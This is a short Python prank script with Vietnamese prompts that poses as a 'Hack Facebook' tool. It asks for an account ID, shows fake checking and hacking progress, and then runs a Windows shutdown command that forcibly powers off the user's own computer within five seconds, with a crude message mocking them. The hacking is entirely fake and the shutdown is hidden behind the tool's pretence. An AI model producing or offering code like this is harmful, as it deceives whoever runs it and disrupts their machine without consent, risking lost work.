import time
import os
import random

print('\n')
print('------------Hack Facebook by Cá Lang Thang---------------')
print('\n')

# get data
inputID = input('Nhập ID Facebook: \n ===> ')
time.sleep(0.2)

#index

timeList = random.choice([2, 5, 8, 10, 15])

# main

print('Start checking...')
time.sleep(5)

if len(inputID) > 3:

	count = 0

	while (count < 101):
		print('Checking', str(count) + '%...')
		count = count + 10
		time.sleep(timeList)

	print('\n')

question = input('Checking done! Do you want start hacking ? [Y/N]\n ==> ')
if question == 'Y' or question == 'y':

	print('\n')
	print('Start hacking...')

	countHack = 0
	while countHack < 101:

		print('Hacking', str(countHack) + '%...')
		countHack = countHack + 10
		time.sleep(timeList)

	print('Hacking done!')
	print('The computer will restart to complete the hack')
	os.system('shutdown -s -t 5 -c "Hack hack cái đầu buồi, làm vậy là xấu nghen"')
	print('\n')

elif question == 'N' or question == 'n':
	print('Stop hacking!')
	print('Goodbye!')
else:
	print('Error!')



